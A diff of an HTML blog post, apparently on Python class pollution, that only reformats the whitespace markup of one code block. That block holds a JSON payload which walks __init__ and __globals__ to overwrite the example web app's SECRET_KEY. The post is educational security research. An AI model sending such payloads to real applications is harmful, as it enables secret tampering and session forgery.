@@ -114,17 +114,17 @@
 <p>The first question I usually ask is, "Why would a developer do this?" In this case, it's a bit of a stretch to merge objects this way. I know I wouldn't do this. But if I never searched for vulnerabilities that were related to things that developers should never do, I'd never find a vulnerability. The author did show that Pydash includes similar merge functionality, but I feel like it's an even further stretch because of what it expects as input. I just can't come up with a halfway decent reason why I would use Pydash like that. If you do, please let me know.</p>
 <p>Given the example application, it's time to leverage what we learned about prototype (or class) pollution in Python to build an attack payload that completes the objective.</p>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-    <span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;Tim&quot;</span><span class="p">,</span>
-    <span class="nt">&quot;birthday&quot;</span><span class="p">:</span><span class="s2">&quot;2/1/1980&quot;</span><span class="p">,</span>
-    <span class="nt">&quot;__init__&quot;</span><span class="p">:{</span>
-        <span class="nt">&quot;__globals__&quot;</span><span class="p">:{</span>
-            <span class="nt">&quot;app&quot;</span><span class="p">:{</span>
-                <span class="nt">&quot;config&quot;</span><span class="p">:{</span>
-                    <span class="nt">&quot;SECRET_KEY&quot;</span><span class="p">:</span><span class="s2">&quot;polluted&quot;</span>
-                <span class="p">}</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;Tim&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;birthday&quot;</span><span class="p">:</span><span class="s2">&quot;2/1/1980&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;__init__&quot;</span><span class="p">:{</span>
+<span class="w">        </span><span class="nt">&quot;__globals__&quot;</span><span class="p">:{</span>
+<span class="w">            </span><span class="nt">&quot;app&quot;</span><span class="p">:{</span>
+<span class="w">                </span><span class="nt">&quot;config&quot;</span><span class="p">:{</span>
+<span class="w">                    </span><span class="nt">&quot;SECRET_KEY&quot;</span><span class="p">:</span><span class="s2">&quot;polluted&quot;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
